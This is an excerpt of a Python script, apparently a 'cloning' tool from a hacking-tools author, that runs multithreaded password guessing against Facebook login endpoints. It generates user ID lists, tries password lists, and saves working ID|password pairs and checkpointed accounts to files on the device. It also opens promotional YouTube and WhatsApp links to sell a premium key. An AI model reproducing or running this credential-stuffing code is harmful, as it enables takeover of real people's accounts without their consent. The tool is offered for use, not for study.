...
os.system('xdg-open https://youtube.com/@RHS6210/')
...
logo=("""'                                                                                                
RRRRRRRRRRRRRRRRR   HHHHHHHHH     HHHHHHHHH   SSSSSSSSSSSSSSS 
R::::::::::::::::R  H:::::::H     H:::::::H SS:::::::::::::::S
R::::::RRRRRR:::::R H:::::::H     H:::::::HS:::::SSSSSS::::::S
RR:::::R     R:::::RHH::::::H     H::::::HHS:::::S     SSSSSSS
  R::::R     R:::::R  H:::::H     H:::::H  S:::::S            
  R::::R     R:::::R  H:::::H     H:::::H  S:::::S            
  R::::RRRRRR:::::R   H::::::HHHHH::::::H   S::::SSSS         
  R:::::::::::::RR    H:::::::::::::::::H    SS::::::SSSSS    
  R::::RRRRRR:::::R   H:::::::::::::::::H      SSS::::::::SS  
  R::::R     R:::::R  H::::::HHHHH::::::H         SSSSSS::::S 
  R::::R     R:::::R  H:::::H     H:::::H              S:::::S
  R::::R     R:::::R  H:::::H     H:::::H              S:::::S
RR:::::R     R:::::RHH::::::H     H::::::HHSSSSSSS     S:::::S
R::::::R     R:::::RH:::::::H     H:::::::HS::::::SSSSSS:::::S
R::::::R     R:::::RH:::::::H     H:::::::HS:::::::::::::::SS 
RRRRRRRR     RRRRRRRHHHHHHHHH     HHHHHHHHH SSSSSSSSSSSSSSS                                                                                                                
--------------------------------------------
 Author    : RAYEES HAZRAT
 Github    : RHS
 YOUTUBE   : RHS
 Tool Name : Free TOOLS
 Type type : Free
 Version   : 0.4
\033[1;37m----------------------------------------------""")
def linex():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://youtube.com/@RHS6210');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://youtube.com/@RHS6210/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://youtube.com/@RHS6210="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RHS Sir, I Need To Buy Your Paid RHS PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python RHS.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as RHS:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RHS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RHS=session.cookies.get_dict().keys()
                        if "c_user" in RHS:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [RHS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RHS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RHS:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RHS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RHS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RHS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RHS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=RsHvY8Vr_PRvHkjInjFABqgY; sb=TcHvY4rFTaYyIjMQdRAvhdqb; wd=980x1671; oo=v1%7C3%3A1677416104',
    ...
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5414.101 Safari/537.36',}
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5414.101 Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RHS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [RHS-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/RHS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [RHS-OK] '+uid+' | '+pas+'\033[1;97m')
